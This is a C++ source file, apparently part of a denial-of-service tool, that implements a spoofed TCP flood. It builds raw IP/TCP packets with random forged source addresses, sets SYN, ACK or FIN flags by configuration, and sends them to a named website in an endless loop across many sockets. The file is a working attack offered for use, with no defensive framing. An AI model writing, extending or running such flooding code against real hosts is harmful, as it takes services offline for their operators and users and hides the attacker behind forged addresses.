#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>

#include "../Headers/Randomizer.hpp"
#include "../Headers/Spoofed_TCP_Flood.hpp"

void Spoofed_TCP_Flood::attack(const int *id) {
    int r;
    std::vector<int> sockets;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
    }
    std::string message{};
    char buf[8192], *pseudogram;
    struct pseudo_header psh{};
    auto *ip = (struct iphdr *) buf;
    auto *tcp = (struct tcphdr *) (buf + sizeof (struct ip));
    struct hostent *hp;
    struct sockaddr_in dst{};
    while (true){
        for(int x = 0; x < conf->CONNECTIONS; x++){
            bzero(buf, sizeof(buf));
            if(!sockets[x]){
                sockets[x] = make_socket(IPPROTO_TCP);
            }

            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
                    logger->Log("Can't resolve the host", Logger::Error);
                    exit(EXIT_FAILURE);
                }
            }else{
                bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
            }
            if((ip->saddr = inet_addr(Randomizer::randomIP().c_str())) == -1){
                continue;
            }

            init_headers(ip, tcp, buf);
            override_options(tcp);

            dst.sin_addr.s_addr = ip->daddr;
            dst.sin_family = AF_UNSPEC;


            psh.source_address = inet_addr(conf->website.c_str());
            psh.dest_address = dst.sin_addr.s_addr;
            psh.placeholder = 0;
            psh.protocol = IPPROTO_TCP;
            psh.length = htons(sizeof(struct tcphdr) + strlen(buf));

            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(buf);
            pseudogram = static_cast<char *>(malloc(static_cast<size_t>(psize)));

            memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
            memcpy(pseudogram + sizeof(struct pseudo_header) , tcp , sizeof(struct tcphdr) + strlen(buf));

            tcp->check = csum( (unsigned short*) pseudogram , psize);


            if((r = static_cast<int>(sendto(sockets[x], buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)))) == -1){
                close(sockets[x]);
                sockets[x] = make_socket(IPPROTO_TCP);
            }else{
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        logger->Log(&message, Logger::Info);
        pause();
    }
}

Spoofed_TCP_Flood::Spoofed_TCP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {

}

void Spoofed_TCP_Flood::override_options(tcphdr *tcp){
    switch (conf->vector){
        case config::SpoofedSyn:
            tcp->syn = 1;
            break;
        case config::SpoofedAck:
            tcp->ack = 1;
            break;
        case config::SpoofedFin:
            tcp->fin = 1;
            break;
        default:break;
    }
}
